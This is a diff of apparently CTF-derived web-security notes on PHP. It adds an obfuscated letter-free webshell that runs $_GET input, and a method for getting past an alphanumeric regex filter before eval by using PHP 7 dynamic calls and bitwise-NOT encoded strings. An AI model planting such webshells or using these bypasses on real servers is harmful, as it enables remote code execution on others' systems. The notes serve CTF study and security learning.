@@ -76,8 +76,17 @@ From VXCTF2018, I used such shell without English, number, and underline, conten
 ```php
 <?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);
 ```  
-From `Meepwn Quals 2018`, I use such shell without text, you can also replace the underline with emoji...
-[VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)
+From `Meepwn Quals 2018`, I use such shell without text, you can also replace the underline with emoji...  
+[VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)  
+
+
+Here comes another advanced problem:  
+```php
+preg_match("/[A-Za-z0-9_$]+/",$a)
+eval($a);
+```  
+I cannot use `$` to create variable anymore, how should I do?  
+In php7.0, there is a new way to run function dynamically such as `('phpinfo')();`, with this way we shorten the length of string. For the limitation on alphanumeric character, we can use **NOT** operator to transform it: `(~%8F%97%8F%96%91%99%90)();`.   
 
 # Bypass blacklist extension  
 [服务器针对文件的解析漏洞汇总](https://mp.weixin.qq.com/s/f0y_AjRtc4NjEqeJe6cPhw)  
